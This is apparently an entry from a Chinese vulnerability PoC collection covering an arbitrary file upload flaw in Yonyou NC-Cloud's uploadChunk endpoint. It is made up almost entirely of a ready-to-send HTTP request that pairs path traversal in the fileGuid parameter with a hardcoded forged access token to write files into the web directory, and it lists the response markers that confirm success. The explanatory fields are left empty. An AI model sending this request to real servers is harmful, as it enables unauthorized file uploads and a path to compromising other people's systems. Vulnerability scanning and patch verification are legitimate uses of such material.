﻿# 用友 NC-Cloud uploadChunk 任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ

--024ff46f71634a1c9bf8ec5820c26fa9
Content-Disposition: form-data; name="file"; filename="test.txt"

This website has an arbitrary file upload vulnerability
--024ff46f71634a1c9bf8ec5820c26fa9--
```

> 响应代码特征：200

> 响应内容特征：操作成功

> 上传文件定位：

> 验证文件来源：用友 NC-Cloud uploadChunk 任意文件上传漏洞.poc
